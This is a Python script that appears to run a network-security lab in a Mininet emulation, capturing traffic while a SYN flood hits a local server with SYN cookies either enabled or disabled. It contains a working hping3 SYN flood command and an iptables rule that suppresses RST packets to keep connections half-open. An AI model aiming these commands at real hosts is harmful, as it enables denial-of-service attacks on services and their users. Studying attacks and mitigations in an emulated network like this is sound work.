import sys
import time
from mininet.net import Mininet
from mininet.topo import SingleSwitchTopo
from mininet.log import setLogLevel


def main(filename, mitigate=False):
    # Set Mininet logging level
    setLogLevel('info')
    # Create a topology with 2 hosts and 1 switch
    topo = SingleSwitchTopo(k=2)
    net = Mininet(topo)
    net.start()
    
    # Get host objects
    h1, h2 = net.get('h1', 'h2')
    h1_ip = h1.IP()  # Typically 10.0.0.1
    h2_ip = h2.IP()  # Typically 10.0.0.2
    
    # Adjust kernel parameters on h2 to optimize the attack
    h2.cmd('sysctl -w net.ipv4.tcp_max_syn_backlog=1000')       # Increase backlog
    if mitigate:
        h2.cmd('sysctl -w net.ipv4.tcp_syncookies=1')           # Enable SYN cookies
        h2.cmd('sysctl -w net.ipv4.tcp_synack_retries=5')
    else:
        h2.cmd('sysctl -w net.ipv4.tcp_syncookies=0')           # Disable SYN cookies
        h2.cmd('sysctl -w net.ipv4.tcp_synack_retries=1')       # Reduce retries
    
    # Start server on h2
    server_proc = h2.popen('python3 server.py')
    
    # Start packet capture on h1
    tcpdump_proc = h1.popen(f'tcpdump -i h1-eth0 -w {filename}.pcap')
    
    # Start legitimate traffic on h1
    legit_proc = h1.popen(f'python3 legitimate.py {h2_ip}')

    # Wait 20 seconds before starting the attack
    print("Waiting 20 seconds before starting SYN flood...")
    time.sleep(20)
    
    if not mitigate:
        # Prevent h1 from sending RST packets to keep connections half-open
        h1.cmd(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -d {h2_ip} --dport 8080 -j DROP')
    
    # Start SYN flood attack on h1
    # flood_proc = h1.popen(f'python3 syn_flood.py {h2_ip} {h1_ip}')
    flood_proc = h1.popen(f'hping3 -c 1000 -d 120 -S -w 64 -p 8080 --fast {h2_ip}')
    print("SYN flood attack started")
    
    # Wait 100 seconds during the attack
    time.sleep(100)
    
    # Stop SYN flood attack
    flood_proc.terminate()
    print("SYN flood attack stopped")
    
    # Wait another 20 seconds
    time.sleep(20)
    
    # Stop legitimate traffic
    legit_proc.terminate()
    print("Legitimate traffic stopped")
    
    # # Stop packet capture
    # tcpdump_proc.terminate()
    # print("Packet capture stopped")
    
    # Stop server
    server_proc.terminate()
    
    # Clean up Mininet
    net.stop()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 main.py <filename> <mitigate_bool>")
        sys.exit(1)
    print(sys.argv)
    main(sys.argv[1], mitigate= True if sys.argv[2] == 'True' else False)